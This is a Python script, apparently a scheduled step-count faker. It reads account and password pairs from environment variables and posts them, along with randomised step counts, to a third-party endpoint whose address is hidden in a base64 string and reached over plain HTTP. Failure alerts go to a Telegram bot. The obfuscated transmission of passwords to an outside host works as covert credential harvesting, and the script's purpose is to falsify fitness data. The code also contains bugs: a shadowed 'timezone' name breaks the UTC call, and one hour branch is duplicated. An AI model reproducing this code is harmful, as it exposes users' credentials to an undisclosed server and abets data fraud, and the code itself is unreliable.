import os
import requests
import base64
import random
from datetime import datetime, time, timezone
import pytz

telegram_api_token = os.environ.get('TELEGRAM_API_TOKEN')
telegram_chat_id = os.environ.get('TELEGRAM_CHAT_ID')

change_step1 = int(os.environ.get('CHANGE_STEP1'))
change_step2 = int(os.environ.get('CHANGE_STEP2'))
change_step3 = int(os.environ.get('CHANGE_STEP3'))
change_step4 = int(os.environ.get('CHANGE_STEP4'))
target_step = int(os.environ.get('TARGET_STEP'))

# 定义你想要的时区（比如，'Asia/Shanghai' 表示上海时间）
timezone_name = 'Asia/Shanghai'
timezone = pytz.timezone(timezone_name)

# 获取当前时间并转换为指定时区的时间
current_time_in_timezone = datetime.now(timezone)

# 获取星期几（0表示星期一，6表示星期日）
weekday_number = current_time_in_timezone.weekday()

# 将数字转换为星期几的名称
weekdays = ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday']
weekday_name = weekdays[weekday_number]

# 检查 Telegram 相关信息是否存在
if telegram_api_token is None or telegram_chat_id is None:
    print("Telegram API Token或聊天ID未设置。无法发送通知。")
    # 在这里可能进行其他处理或记录日志，因为无法发送通知
else:
    accounts_and_passwords = os.environ['ACCOUNTS_AND_PASSWORDS']
    account_password_pairs = [pair.split(',') for pair in accounts_and_passwords.split(';')]

    def send_telegram_message(message):
        telegram_url = f"https://api.telegram.org/bot{telegram_api_token}/sendMessage"
        data = {
            'chat_id': telegram_chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(telegram_url, data=data)

    def modify_steps(account, password, min_steps=None, max_steps=None, attempts=3, timeout=20):
        consecutive_failures = 0
        for _ in range(attempts):
            try:
                encoded_url = 'aHR0cDovL2JzLnN2di5pbmsvaW5kZXgucGhw'
                url = base64.b64decode(encoded_url).decode('utf-8')
                steps = random.randint(min_steps, max_steps)
                data = {
                    'account': account,
                    'password': password,
                    'steps': steps
                }

                try:
                    response = requests.post(url, data=data, timeout=timeout)
                    result = response.json()

                    if result.get('message') == 'success':
                        return {
                            'account': account,
                            'response': result.get('message', 'No message found in response')
                        }
                    else:
                        consecutive_failures += 1
                except Exception as e:
                    consecutive_failures += 1

                if consecutive_failures == 3:
                    telegram_message = f"<b>Steps_modifier</b>\n\n账号： {account}\n连续三次失败"
                    send_telegram_message(telegram_message)
                    return {
                        'account': account,
                        'response': "Exceeded maximum consecutive failures"
                    }
            except Exception as e:
                telegram_message = f"<b>Steps_modifier</b>\n\n账号： {account}\n错误： {str(e)}"
                send_telegram_message(telegram_message)

        return {
            'account': account,
            'response': "Exceeded maximum attempts"
        }

    if __name__ == "__main__":
        # 获取当前时间，并转换为 UTC 时间
        current_time_utc = datetime.now(timezone.utc)
        current_time_t = current_time_utc.time()

        if (current_time_t.hour == 2):
            min_steps = change_step1 - 188
            max_steps = change_step1 + 228
        elif (current_time_t.hour == 6):
            min_steps = change_step2 - 188
            max_steps = change_step2 + 228
        elif (current_time_t.hour == 10):
            min_steps = change_step3 - 188
            max_steps = change_step3 + 228
        elif (current_time_t.hour == 10):
            min_steps = change_step4 - 188
            max_steps = change_step4 + 228
        else:
            min_steps = target_step - 16
            max_steps = target_step + 22

        if (weekday_number == 5 or weekday_number == 6) :
            min_steps = min_steps + 2000
            max_steps = max_steps + 2000

        for account, password in account_password_pairs:
            result = modify_steps(account, password, min_steps, max_steps)
            hidden_account = account[:3] + '*' * (len(account) - 6) + account[-3:]

            print("账号:", hidden_account)
            print("响应:", result['response'])
